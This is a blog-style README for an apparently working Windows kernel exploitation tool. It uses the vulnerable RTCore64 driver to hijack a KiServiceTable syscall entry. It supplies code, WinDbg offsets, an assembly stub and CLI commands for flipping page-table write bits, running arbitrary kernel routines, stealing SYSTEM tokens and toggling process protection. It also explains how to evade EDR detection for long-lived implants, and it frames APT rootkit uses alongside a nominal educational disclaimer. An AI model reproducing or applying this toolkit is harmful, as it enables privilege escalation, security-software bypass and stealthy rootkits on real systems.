
## 🚀 Blog Title: Executing Kernel Routines via Syscall Table Hijack

### 🔍 Overview

This post demonstrates a powerful kernel-mode code execution technique by **temporarily hijacking the syscall dispatch table** in Windows — specifically the `KiServiceTable`. The idea is to:

- Flip page permissions at the PDE level to allow writing to what is normally read-only memory.
- Overwrite a specific syscall entry (`NtSetQuotaInformationFile`) with the address of another kernel routine of our choosing (`PsLookupProcessByProcessId` in this example).
- Trigger the syscall to execute our chosen routine.
- Restore everything afterward to maintain stability and reduce detection.

What makes this method particularly potent is that it **bypasses multiple modern defenses**:

- ✅ **KCFG** (Kernel Control Flow Guard)
- ✅ **KCET** (Kernel Code Execution Prevention)
- ✅ **W^X** (Write XOR Execute memory protections)
- ✅ **Hypervisor-based protections**
- ✅ **VBS** (Virtualization-Based Security)

> ⚠️ **Note**: This is intended for educational and research purposes only. Unauthorized use may violate laws and policies.

**It doesn’t have to be a full routine — you can hijack the syscall to jump to a kernel-mode ROP gadget and even chain multiple gadgets for advanced execution**

---

### 🧨 Offensive Applications & APT Use Cases

Advanced Persistent Threat (APT) groups and sophisticated attackers can leverage this technique to:

- 🧬 Build stealthy kernel-mode rootkits
- 🔗 Chain multiple legitimate kernel routine calls
- 🧠 Subvert security software from kernel context
- ☠️ Target hypervisors via nested virtualization or hypercalls

> ⚠️ This makes it a powerful post-exploitation tool when kernel code execution is already achieved.

---

### 🔑 Starting Point: Gaining a Read/Write Primitive

Before we can perform any of the actions described in this post, we need a reliable **read/write primitive** in kernel space. This technique assumes that you already have one — in our case, I used the well-known **RTCore64** driver to demonstrate this.

> 🧪 RTCore64, originally distributed with MSI Afterburner, is known for exposing ring-0 memory access through IOCTLs, which makes it useful for research and educational exploitation scenarios.

Once you have read/write capabilities in kernel memory, your options dramatically expand. Some of the things you can do include:

* 🔍 Read kernel structures (like `EPROCESS`, `KTHREAD`, etc.)
* 🔧 Modify kernel objects (e.g., token stealing for privilege escalation)
* 📌 Disable or patch hooks placed by security software
* 🔁 Swap function pointers to hijack execution (as done in this post)
* 🔒 Circumvent memory protection mechanisms by flipping PTE/PDE flags

This blog focuses on the **syscall hijack** method, but it's just one of many paths you can take once a read/write primitive is obtained.

---

### 📚 Prerequisites

To fully understand and follow along with this post, you should have:

- ⚙️ **Windows Kernel Internals Knowledge** – Familiarity with system service dispatching, EPROCESS structures, and common kernel routines.
- 🧠 **Memory Exploitation Fundamentals** – Understanding of read/write primitives and how they’re used in kernel-mode exploitation.
- 🧮 **Paging & Virtual Memory** – In-depth knowledge of Windows memory management, particularly how **PTEs (Page Table Entries)** and **PDEs (Page Directory Entries)** control memory access and permissions.
- 🛠️ **Windbg / Kernel Debugging Experience** – Ability to navigate and extract data from kernel debug sessions using Windbg.

---

### 🧠 Key Concepts

- **`KiServiceTable`**: The internal Windows table used by the syscall dispatcher to resolve syscall numbers to actual kernel function addresses.
- **PTE/PDE Manipulation**: Changing page table and directory flags to override memory protection (e.g., enabling write access).
- **Syscall Hijacking**: Replacing a legitimate syscall entry with a custom or unintended routine to gain controlled execution in kernel mode.
- **`PsLookupProcessByProcessId`**: A useful kernel function that resolves a `PID` to an `EPROCESS` structure pointer — often used in privilege escalation and kernel object manipulation.

### Hijacking NtSetQuotaInformationFile Syscall

We chose to hijack `NtSetQuotaInformationFile` specifically because it's a **rarely used syscall in most environments**. This minimizes the chance of interference with normal system operations (BSOD).

The goal is to **hijack the syscall of `NtSetQuotaInformationFile`** and redirect it to another kernel-mode routine or gadget of our choosing (e.g., `nt!PsLookupProcessByProcessId`).

To accomplish this, we must:
1. Identify the syscall number for `NtSetQuotaInformationFile`.
2. Locate and modify the corresponding entry in the `nt!KiServiceTable`.
3. Overcome memory protection to allow editing the read-only service table.

**It doesn’t have to be a full routine — you can hijack the syscall to jump to a kernel-mode ROP gadget and even chain multiple gadgets for advanced execution**

---

##### Extracting the Syscall Number

To find the syscall number of `NtSetQuotaInformationFile`, open `ntdll.dll` (located in `C:\WINDOWS\SYSTEM32`) using **IDA Pro** or another disassembler.

From the disassembly:

![NtSetQuotaInformationFile](./screenshots/NtSetQuotaInformationFile.png)
![Syscall Number](./screenshots/syscall_number.png)

We can see that the **syscall number is `0x1B8`** (440 in decimal).

---

##### Understanding `nt!KiServiceTable`

The `nt!KiServiceTable` is a kernel array of function pointers (each 4 bytes on x64 systems), used by the syscall dispatcher to locate the correct handler.

To get the current pointer for `NtSetQuotaInformationFile`, multiply the syscall number by 4 and inspect the entry:

```shell
2: kd> dds nt!KiServiceTable + 0x04 * 0x1b8 L1
fffff803`eb2d9e80  0639c300
```

This value is an offset — to determine where it points, shift it right by 4 bits and add it to the base of the service table:

```shell
2: kd> u nt!KiServiceTable + (0639c300 >> 4) L4
nt!NtSetQuotaInformationFile:
fffff803`eb9133d0 4883ec38        sub     rsp,38h
fffff803`eb9133d4 e837a6ffff      call    nt!IopSetEaOrQuotaInformationFile
fffff803`eb9133d9 4883c438        add     rsp,38h
fffff803`eb9133dd c3              ret
```

This confirms that the handler for `NtSetQuotaInformationFile` is indeed located here.

---

##### Redirecting the Syscall to Our Target

We want to replace this handler with another kernel routine, for example, `nt!PsLookupProcessByProcessId`.

First, compute the new offset to use in the `KiServiceTable` entry:

```shell
2: kd> ? ( nt!PsLookupProcessByProcessId - nt!KiServiceTable ) << 4
Evaluate expression: 137195520 = 00000000`082d7000
```

So the new value to inject at index `0x1B8` is `0x082d7000`.

---

##### Bypassing Read-Only Protection

Attempting to overwrite the `nt!KiServiceTable` directly will fail because it is **read-only**:

<pre>
1: kd> !pte nt!KiServiceTable
                                           VA fffff803eb2d97a0
PXE at FFFFF67B3D9ECF80    PPE at FFFFF67B3D9F0078    PDE at FFFFF67B3E00FAC8    PTE at FFFFF67C01F596C8
contains 00000000007F7063  contains 0000000000829063  contains 8A0000011BC001E3  contains 0000000000000000
pfn 7f7       ---DA--KWEV  pfn 829       ---DA--KWEV  pfn 11bc00    -GLDA--K<mark>R</mark>-V  LARGE PAGE pfn 11bcd9      
</pre>

- The `PTE` is **not valid (zeroed)** — so protection is governed at the **Page Directory Entry (PDE)** level.
- The PDE flags include `R` (Read), but **not `W` (Write)**, making the page **read-only**.

> **Key Insight**: Since the page table entry is invalid, control of memory access is governed by the PDE. To gain write access, you must **flip the PDE's "Read-only" flag to "Write"**.

---

##### Summary

To hijack `NtSetQuotaInformationFile`:

1. **Get syscall number** using disassembly (e.g., `0x1B8`).
2. **Locate the target function pointer** in `nt!KiServiceTable + 4 * 0x1B8`.
3. **Compute the offset** for your replacement function (`<< 4`).
4. **Modify the PDE** to make the page writable.
5. **Overwrite the entry** in the service table with the new offset.

> ⚠️ This technique requires **kernel-level privileges** and direct manipulation of memory protection — typically achievable in exploit development or rootkit scenarios. Use responsibly and legally.

### Code Walkthrough

> ℹ️ The steps below describe the conceptual sequence. In the actual source the work is split into three reusable primitives on `kernelHelper` — `prepareHijack()` (steps 1–4), `pointSyscallTo(target, stackArgs)` (step 5), and `restoreHijack()` (step 8) — so it can be reused for the `/privesc` demo and for arbitrary target routines. See **Generalizing the hijack** further down.

#### 1. **Find ntoskrnl Base Address**

```cpp
DWORD64 nt_base = (DWORD64)this->lpNtosBase;
```
You obtain the base of the Windows kernel in memory (I am using `EnumDeviceDrivers` for this).

#### 2. **Read Address of KiServiceTable**

```cpp
DWORD64 nt_KiServiceTable;
VirtualRead(nt_base + KeServiceDescriptorTableShadow_Offset_fromNT, &nt_KiServiceTable, sizeof(nt_KiServiceTable));
```
You read the hardcoded offset where `KiServiceTable` lives. This offset must match your target Windows build.

You can get the offset `KeServiceDescriptorTableShadow_Offset_fromNT` in a local kernel debug session in windbg

<pre>
2: kd> dqs nt!KeServiceDescriptorTableShadow L5
fffff802`e6bc5280  <mark>fffff802`e5cd97a0 nt!KiServiceTable</mark>
fffff802`e6bc5288  00000000`00000000
fffff802`e6bc5290  00000000`000001e9
fffff802`e6bc5298  fffff802`e5cd9f48 nt!KiArgumentTable
fffff802`e6bc52a0  fffff802`77dcc000 win32k!W32pServiceTable
2: kd> ? nt!KeServiceDescriptorTableShadow - nt
Evaluate expression: 16536192 = <mark>00000000`00fc5280</mark>
</pre>

#### 3. **Get PTE (Page Table Entry) Base Address in kernel memory.**
at `nt!MiGetPteAddress + 0x13` we can get the PTE Base address.
```
dq nt!MiGetPteAddress + 0x13
```

#### 4. **Get PDE for KiServiceTable and Flip R/W Bit**

```cpp
DWORD64 ntKiServiceTable_pde_flags;
// Flip R/W bit (bit 1)
New_ntKiServiceTable_pde_flags = ntKiServiceTable_pde_flags ^ (1 << 1);
WriteMemoryDWORD64(ntKiServiceTable_pde, New_ntKiServiceTable_pde_flags);
```

You're enabling write access to the memory page that contains the `KiServiceTable`, which is normally read-only.

#### 5. **Hijack the Syscall**

```cpp
		DWORD64	NtSetQuotaInformationFile = (DWORD64)nt_KiServiceTable + NtSetQuotaInformationFile_syscallnumber * 0x04;
	// PsLookupProcessByProcessId Kernel Address
	DWORD64 PsLookupProcessByProcessId = (DWORD64)nt_base + PsLookupProcessByProcessId_Offset_fromNT;
  // Calculate the offset to jump to PsLookupProcessByProcessId
	DWORD offset = (DWORD)(PsLookupProcessByProcessId - nt_KiServiceTable);
	DWORD shifted = offset << 4;
	// Overwrite the NtSetQuotaInformationFile syscall offset in the Dispatch table with the new one
	b = this->objMemHandler->WriteMemoryPrimitive(0x04, NtSetQuotaInformationFile, shifted);
```

You overwrite the `NtSetQuotaInformationFile` syscall pointer to jump to `PsLookupProcessByProcessId`.

You can get `PsLookupProcessByProcessId_Offset_fromNT` from windbg local kernel session.

```
2: kd> ? nt!PsLookupProcessByProcessId - nt
Evaluate expression: 9465504 = 00000000`00906ea0
```

#### 6. **Call the Hijacked Syscall using asm**

```cpp
NTSTATUS status = HijackedSyscall((HANDLE)pid, (DWORD64)PEProcess);
```

```masm
HijackedSyscall PROC
	mov r10, rcx
	mov eax, syscallNumber  ; populated at runtime from ntdll!NtSetQuotaInformationFile
	syscall
	ret
HijackedSyscall ENDP
```

You call the syscall, which now executes `PsLookupProcessByProcessId` in kernel context, passing a PID and an allocated memory buffer to receive the EPROCESS pointer.

> Because the stub is just the standard syscall ABI, it works for any routine arity. The C++ side casts `HijackedSyscall` to one of `PFN_HSC_2` … `PFN_HSC_8` (declared in `kernelHelperUtil.h`) to match the redirect target's signature — `PFN_HSC_2` for `PsLookupProcessByProcessId`, `PFN_HSC_3` for `memcpy`, etc.

#### 7. **Read Process Name**

```cpp
	b = this->objMemHandler->VirtualRead(
		(DWORD64)KernelEprocess + imageFileNameOffset,
		&processname,
		sizeof(processname)
	);

	// Print the string
	printf("[>] Process Name: %s\n", processname);
  ```

You parse the `ImageFileName` field from the EPROCESS structure to identify the target process with our Read Primitive.

You can get the `ImageFileName` offset from windbg local kernel session.

```
2: kd> dt _EPROCESS ImageFileName
nt!_EPROCESS
   +0x338 ImageFileName : [15] UChar
```

#### 8. **Cleanup**

You restore:
- The original syscall handler:
  ```cpp
  WriteMemoryPrimitive(0x04, NtSetQuotaInformationFile, orig_syscall_offset);
  ```
- Original memory protection:
  ```cpp
  WriteMemoryDWORD64(ntKiServiceTable_pde, ntKiServiceTable_pde_flags);
  ```

---

### 🧾 Offsets — what's dynamic vs. what you must verify

The project splits offsets into two groups: **dynamic** (resolved at runtime, no edit needed) and **manual** (must be confirmed in WinDbg for your kernel build).

#### ✅ Dynamic — handled automatically by `kernelHelper::resolveKernelArtifacts()`

| Item | How it's resolved |
| --- | --- |
| `NtSetQuotaInformationFile` syscall # | Read the 4 bytes after `B8` in the `ntdll!NtSetQuotaInformationFile` prologue (`4C 8B D1  B8 ?? ?? ?? ??`). |
| `nt!PsLookupProcessByProcessId` address | `LoadLibraryEx("ntoskrnl.exe", DONT_RESOLVE_DLL_REFERENCES)` + `GetProcAddress` + (kernel base + RVA). |
| `nt!memcpy` address (used by `/privesc` and `/ppl`) | Same trick. |
| `ntoskrnl.exe` base | `EnumDeviceDrivers` (requires SYSTEM on modern Win11). |

If any dynamic lookup fails, the code falls back to the hardcoded values in `offsets.h`.

#### ⚠️ Manual — verify in WinDbg before running

These cannot be resolved dynamically (not exported, or struct layouts). Wrong values will **BSOD** the box.

```cpp
// kd> ? nt!KeServiceDescriptorTableShadow - nt
#define KeServiceDescriptorTableShadow_Offset_fromNT 0xfc6280

// PTE_BASE pointer lives at (MiGetPteAddress + 0x13) inside ntoskrnl.
// kd> ? (nt!MiGetPteAddress + 0x13) - nt
#define MiGetPteAddress_Offset_fromNT 0x4336e3

// kd> dt nt!_EPROCESS ImageFileName
#define imageFileNameOffset 0x338

// kd> dt nt!_EPROCESS Token
// EX_FAST_REF — low 4 bits = cached ref count, upper bits = token pointer.
#define tokenOffset 0x4b8

// kd> dt nt!_EPROCESS Protection
// _PS_PROTECTION (1 byte): Type bits 0..2, Audit bit 3, Signer bits 4..7.
// Only needed if you use /ppl.
#define protectionOffset 0x6fa
```

#### 🧪 One paste-block to verify everything before running

This is the full WinDbg pre-flight checklist for the project. Paste it into your live-kernel session against the same `ntoskrnl.exe` the binary will run against — every line in the output corresponds to one `#define` in `offsets.h`.

```
kd> ? nt!KeServiceDescriptorTableShadow - nt
kd> ? (nt!MiGetPteAddress + 0x13) - nt
kd> dt nt!_EPROCESS ImageFileName Token Protection
```

What you should see, and which `#define` each line feeds:

| WinDbg output | Maps to `offsets.h` define |
| --- | --- |
| `Evaluate expression: <hex> = ` from line 1 | `KeServiceDescriptorTableShadow_Offset_fromNT` |
| `Evaluate expression: <hex> = ` from line 2 | `MiGetPteAddress_Offset_fromNT` |
| `+0x??? ImageFileName` | `imageFileNameOffset`   *(all three demos)* |
| `+0x??? Token` | `tokenOffset`           *(`/privesc`)* |
| `+0x??? Protection` | `protectionOffset`      *(`/ppl` only)* |

If any value differs from the `offsets.h` constant currently checked in, **edit `offsets.h` before rebuilding** — every one of these is a BSOD vector if wrong on a live kernel.

Bonus: if you also want to confirm the runtime-resolved items aren't drifting (e.g. you suspect a Windows update changed something), the WinDbg one-liners are:

```
kd> u ntdll!NtSetQuotaInformationFile L1   ; first instruction; the syscall # is the imm32 after `mov eax`
kd> ? nt!PsLookupProcessByProcessId - nt
kd> ? nt!memcpy - nt
```

You shouldn't need to edit anything for these — they're resolved at runtime from `ntdll` / `ntoskrnl` exports — but it's a quick sanity check before you trust the `[>]` resolution lines the binary prints on startup.

---

### 🧬 Generalizing the hijack — calling any API with any arity

There are two pieces here: **the table entry** (how the kernel finds the routine to call), and **the arguments** (how data gets from your `((PFN_HSC_N)HijackedSyscall)(...)` C++ call all the way into the hijacked routine's registers and stack). They're independent — the entry tells the kernel *what to call*, the calling convention tells it *what to pass*.

#### The `KiServiceTable` entry — a packed 32-bit DWORD

```
 31                                            4 │ 3        0
┌─────────────────────────────────────────────────┼────────────┐
│   signed byte offset from KiServiceTable        │  stackArgs │
│   (routine_addr − KiServiceTable)               │            │
└─────────────────────────────────────────────────┴────────────┘
```

- **Bits 4..31** — `(routine_addr − KiServiceTable)` shifted *left* by 4. The kernel reads them back with an arithmetic shift right by 4, so the offset is treated as signed (the routine can sit below the table, though in practice it doesn't).
- **Bits 0..3** — `stackArgs`, the count of 8-byte arguments **beyond** the 4 register args. So a 2-arg or 4-arg routine → 0. A 7-arg routine → 3. An 8-arg routine → 4.

`pointSyscallTo(addr, stackArgs)` builds this DWORD and writes it via the R/W primitive:

```cpp
DWORD entry = ((DWORD)(routine_addr - KiServiceTable) << 4) | (stackArgs & 0xF);
WriteMemoryPrimitive(4, KiServiceTable + syscallNum*4, entry);
```

#### How arguments flow into the hijacked routine

Microsoft x64 ABI everywhere — same convention in user mode, in the asm stub, and in the kernel-side handler. The only twist is the `syscall` instruction in the middle, which the asm stub bridges.

```
┌─── User mode ───────────────────────────────────────────────────────────┐
│                                                                         │
│  ((PFN_HSC_3)HijackedSyscall)(a, b, c);                                 │
│                                                                         │
│  Compiler emits (Microsoft x64 ABI):                                    │
│      RCX = a                                                            │
│      RDX = b                                                            │
│      R8  = c                                                            │
│      R9  = arg4   (if present)                                          │
│      [rsp+0x28]   = arg5  ┐                                             │
│      [rsp+0x30]   = arg6  │  (caller's frame, after the                 │
│      [rsp+0x38]   = arg7  │   call instruction's return-addr push)      │
│      ...                  ┘                                             │
│                                                                         │
│  HijackedSyscall asm stub:                                              │
│      mov  r10, rcx           ; SYSCALL clobbers RCX with return addr,   │
│                              ; so arg1 is staged in R10 first           │
│      mov  eax, syscallNumber ; resolved syscall # of NtSetQuotaInfoFile │
│      syscall                 ; CPU: R11=RFLAGS, RCX=RIP, RIP=LSTAR      │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
                                  │
                                  ▼  (mode switch via SYSCALL)
┌─── Kernel mode ─────────────────────────────────────────────────────────┐
│                                                                         │
│  nt!KiSystemCall64:                                                     │
│      • switches to kernel stack, builds trap frame, saves user state    │
│      • reads EAX (syscall #)                                            │
│      • fetches entry = KiServiceTable[EAX]                              │
│      • decodes:  routine     = KiServiceTable + (entry >> 4)            │
│                  stack_args  = entry & 0xF                              │
│      • if stack_args > 0, KiSystemServiceCopyEnd copies stack_args*8    │
│        bytes from the user stack ([user_rsp+0x28]…) onto the kernel     │
│        stack at the same offset (so [k_rsp+0x28]… is identical to       │
│        what the caller staged)                                          │
│      • restores RCX from R10  (RCX = a again)                           │
│      • calls routine(RCX, RDX, R8, R9, [rsp+0x28]…)                     │
│                                                                         │
│  The hijacked routine sees:                                             │
│      RCX = a, RDX = b, R8 = c, R9 = arg4,                               │
│      [rsp+0x28]+ = whatever stack args the caller staged                │
│  — identical to a direct kernel call. No fix-ups needed.                │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

Three things to take away from that flow:

1. **The asm stub is arity-agnostic.** Same 4 instructions whether you're calling a 2-arg routine or an 8-arg one. The compiler on the C++ side stages everything correctly because you cast to the matching `PFN_HSC_N` typedef.
2. **`stackArgs` in the table entry is what makes >4-arg calls work.** Forget to set it and the kernel won't copy your `[rsp+0x28]+` data over — the hijacked routine reads garbage for args 5+ and BSODs (or worse, silently misbehaves).
3. **Arg 1 surviving the SYSCALL relies on R10.** That's the whole reason for `mov r10, rcx` — the SYSCALL instruction overwrites RCX with the return address, so the kernel-side handler restores RCX from R10 before invoking the target routine.

#### Putting it together

```cpp
helper.prepareHijack();                                  // flip PDE R/W, save state
helper.pointSyscallTo(target_kernel_addr, /*stackArgs*/0);
NTSTATUS s = ((PFN_HSC_3)HijackedSyscall)(a, b, c);      // 3 args, all in regs

helper.pointSyscallTo(other_kernel_addr, /*stackArgs*/3); // redirect to a 7-arg API
NTSTATUS s2 = ((PFN_HSC_7)HijackedSyscall)(a,b,c,d,e,f,g);

helper.restoreHijack();                                  // restore entry + PDE
```

The `PFN_HSC_2` … `PFN_HSC_8` typedefs live in `kernelHelperUtil.h`; cast `HijackedSyscall` to the one that matches the routine's arity. The same syscall slot can be repointed any number of times between `prepareHijack()` and `restoreHijack()` — that's exactly how `/privesc` chains two different routines through one hijack window.

---

### 🔓 Privesc demo — `/privesc <PID>`

`bool kernelHelper::privesc(DWORD32 pid)` chains two hijacks to elevate the target process's primary token to SYSTEM:

1. **`prepareHijack()`** — flip the PDE R/W bit, snapshot the original entry.
2. **Hijack #1** → `PsLookupProcessByProcessId`. Called twice in the same hijack window:
   - once for the target PID → returns target `EPROCESS`,
   - once for PID 4 (System) → returns SYSTEM `EPROCESS`.
3. Read both `EPROCESS.Token` (EX_FAST_REF) values through the existing R/W primitive. Compute `newToken = (system & ~0xF) | (target & 0xF)` — keep the target's cached ref count, take SYSTEM's pointer bits.
4. **Hijack #2** → `nt!memcpy`. The same syscall slot is now redirected to a 3-arg API. Call it as `memcpy((PVOID)(targetEPROC + Token), &newToken, sizeof(DWORD64))` — the actual token write happens **in kernel mode**, not via the RTCore64 R/W primitive.
5. **`restoreHijack()`** — restore the original entry + PDE flags.

After this returns, any new process spawned by the target PID (or the next time a privileged check is made against it) runs as SYSTEM.

> ⚠️ The EPROCESS refs taken by `PsLookupProcessByProcessId` are intentionally not released in this PoC (the routine returns a referenced object). For a long-lived implant you'd want to call `ObfDereferenceObject` (also via a hijack) to balance the refcount.

---

### 🛡️ PPL toggle — `/ppl <PID> <0|1>`

`bool kernelHelper::pplToggle(DWORD32 pid, BOOL makeProtected)` reuses the same two-hijack pattern as `/privesc`, but writes a **single byte** instead of a token pointer. The byte sits at `_EPROCESS.Protection` (offset = `protectionOffset` in `offsets.h`):

```
_PS_PROTECTION  (1 byte total)
┌────────────┬──────┬───────────────────┐
│  Signer    │ Aud  │      Type         │
│  bits 4..7 │ bit3 │   bits 0..2       │
└────────────┴──────┴───────────────────┘
```

| Field | Values |
|---|---|
| `Type` | 0 = None · 1 = ProtectedLight (PPL) · 2 = Protected (PP) |
| `Signer` | 0 = None · 1 = Authenticode · 4 = Windows · 6 = WinTcb · 7 = WinSystem · ... |

The CLI maps:

| `/ppl <PID> X` | Written byte | Decoded |
|---|---|---|
| `0` | `0x00` | unprotected |
| `1` | `0x61` | Type = ProtectedLight, Signer = WinTcb  (same as LSASS) |

Sequence:

1. **`prepareHijack()`** — flip the PDE R/W bit, snapshot the original entry.
2. **Hijack #1** → `PsLookupProcessByProcessId(pid, &out)` to fetch the target's `EPROCESS`.
3. **Read** the current Protection byte via the R/W primitive (display-only — lets you see the before-state).
4. **Hijack #2** → `memcpy(targetEPROC + Protection, &newByte, 1)` — kernel-mode 1-byte write that flips `_PS_PROTECTION`.
5. **Verify** by re-reading via the R/W primitive.
6. **`restoreHijack()`** — restore the original entry + PDE flags.

The same caveats as `/privesc` apply (`memcpy` must resolve, the EPROCESS lookup leaks a ref). One extra: **on modern kernels, setting PPL via only the Protection byte isn't always sufficient** — `SignatureLevel` and `SectionSignatureLevel` (single-byte fields adjacent to Protection) may also be checked by certain code paths (e.g., DLL-loading enforcement). For full LSASS-style PPL, patch those too. The `/ppl` demo intentionally writes only one byte so the technique stays minimal and obvious.

---

### 🔐 Security Bypass Summary

This technique effectively bypasses multiple modern kernel security mechanisms:

**KCFG (Kernel Control Flow Guard):** this technique will not trigger KCFG as it is a syscall dispatcher that doesn't trigger KCFG.

**KCET (Kernel Code Execution Prevention):** No KCET violations, as we are not overwriting any return addresses in the stack.

**W^X Policies:** We never write to executable memory directly — memory remains either writable or executable, but not both.

**Hypervisor-based protections & VBS:** Hijacking the syscall doesn't violate HVCI because it's only read write bit we are changing or modifying in the page tables. hyperv will trust the kernel with these changes. the normal page tables will not be verified by the EPT if you change something from read to write or write to read :) => it's by design.

> Every demo in this repo (`/codeexecution`, `/privesc`, `/ppl`) only calls code that already lives in `ntoskrnl.exe`'s `.text`, which HVCI keeps RX-locked in EPT — so HVCI's W^X enforcement never has anything to object to. Combined with the data-only PDE flip above, that's why the technique works end-to-end on a fully VBS-hardened Win11 box.

**PatchGuard:** PatchGuard watches for modifications to critical structures. However, since this hijack is temporary and fully restored shortly after execution, it significantly lowers the risk of PatchGuard triggering a bug check.

**And It doesn't seems PatchGuard checks that entry at all as I left it modified for an hour and no BSOD.**

---

### 🕵️ EDR sidestep — using the hijack itself as the kernel R/W primitive

The most common BYOVD detection signal isn't the *technique* — it's the **volume of IOCTLs the vulnerable driver receives**. RTCore64 in particular has well-known IOCTL signatures; an EDR that sees the same process pinging it dozens of times per second has a reliable IOC even without ever inspecting *what's* being read.

This technique gives you a way to **collapse that pattern to a single setup burst**. Once the hijack slot is established, you don't need to keep talking to RTCore64 — the hijack itself becomes your kernel R/W primitive:

- **Kernel writes:** point the slot at `nt!memcpy(dest, src, len)` and write from a user buffer into kernel memory. That's exactly how `/privesc` and `/ppl` already work — the token swap and the `_EPROCESS.Protection` flip both happen **through the hijack**, not back through RTCore64.
- **Kernel reads:** same trick — point the slot at `nt!memcpy(user_buf, kernel_src, len)` (or any read accessor with a similar shape) and the data lands in user space without an RTCore64 IOCTL.

#### The threat-model shift, visually

```
                       RTCore64 IOCTLs over time  →
Naive BYOVD chain      █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █ █
                       ▲                                             ▲
                       setup                                 every R/W call
                                (sustained — easy to alert on the rate)

Bootstrap-then-quiet   █ █ █ █ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░ ░
                       ▲       └──────── NtSetQuotaInformationFile ────┘
                       setup   syscalls — indistinguishable from normal
                               process syscall traffic
```

#### Honest scope — what this does and doesn't hide

RTCore64 still has to surface during **initial setup**. Specifically, the IOCTLs needed before the hijack is live:

1. Read `KeServiceDescriptorTableShadow` → resolve `KiServiceTable` address.
2. Read the original `KiServiceTable[NtSetQuotaInformationFile]` entry (so we can restore it later).
3. Read the PDE covering the table page.
4. Write the PDE with the R/W bit flipped.
5. Write the new `KiServiceTable` entry pointing at the first target routine.

That's the bootstrap burst. After step 5, every subsequent kernel R/W can go through the hijack — no more RTCore64 traffic until cleanup (and even cleanup can in principle be routed through the hijack, leaving only the final PDE-restore write).

So the vulnerable driver is **never invisible** — it's visible for a short, bounded setup burst and then goes quiet. An EDR that already alerts on RTCore64 *loading*, or on the very first IOCTL, still catches the bootstrap. What this defeats is the **sustained IOCTL pattern** that long-lived implants would otherwise generate.

#### Where this is useful

- **Long-lived implants** that need ongoing kernel R/W (token swaps on freshly spawned processes, periodic callback unhooks, on-demand object hides). After the one-time bootstrap, every subsequent R/W shows up as `NtSetQuotaInformationFile` syscall traffic.
- **Heuristic IOCTL-rate detections.** Many EDRs key on the *rate* of suspicious IOCTLs to a known-vulnerable driver more than on the first one. Collapsing steady-state traffic to a single setup burst sidesteps that class of heuristic.
- **Reducing forensic noise.** ETW providers that log driver IRPs see one short burst instead of a continuous stream correlated 1:1 with the implant's kernel operations.
- **Constraining the IOC window.** If incident responders look for "process X talked to RTCore64 between T and T+10s," they get a tiny window to correlate against — versus the entire implant lifetime.

> Combined with the HVCI/VBS bypass story above, the full claim is: this technique runs **on a fully-hardened Win11 box** while leaving **the minimum possible BYOVD telemetry footprint** for an arbitrary-kernel-R/W primitive — one setup burst, then ordinary-looking syscalls.

---

### ✅ POC (Proof of Concept)

To run this POC successfully, you must execute it as SYSTEM. This is because the code uses EnumDeviceDrivers to leak the kernel base address — a technique that no longer works from medium integrity on recent versions of Windows 11.

🔧 Elevation Tip
To elevate to SYSTEM privileges, you can use Sysinternals' PSExec:

```
psexec.exe -i -s cmd.exe
```
This will launch a command shell as SYSTEM, allowing the exploit to function correctly.

🕵️ Alternative (Medium Integrity)
If you're restricted to medium integrity, you can use a side-channel technique to leak the kernel base address instead nowadays. A tool for this is available here:

👉 https://github.com/exploits-forsale/prefetch-tool

#### CLI

```
KernelCodeExecution.exe /installDriver              # one-shot: register RTCore64.sys
KernelCodeExecution.exe /codeexecution <PID>        # demo 1: read target process's image name
KernelCodeExecution.exe /privesc       <PID>        # demo 2: swap target's token to SYSTEM
KernelCodeExecution.exe /ppl           <PID> <0|1>  # demo 3: toggle PPL via 1-byte kernel memcpy
KernelCodeExecution.exe /uninstallDriver            # cleanup
```

![POC](./screenshots/POC.png)

---

### 🧯 Warning

This code operates in kernel space and modifies protected memory. It **must not** be used in production or against systems you don’t own. Tampering with kernel memory can lead to **system crashes**, **BSODs**, and **security violations**.

---

### ✅ Conclusion

Hijacking syscall entries like this demonstrates the power and risks of low-level Windows exploitation. Proper memory manipulation, address resolution, and cleanup are all critical for success and system stability.

Use this responsibly — and only in lab environments.
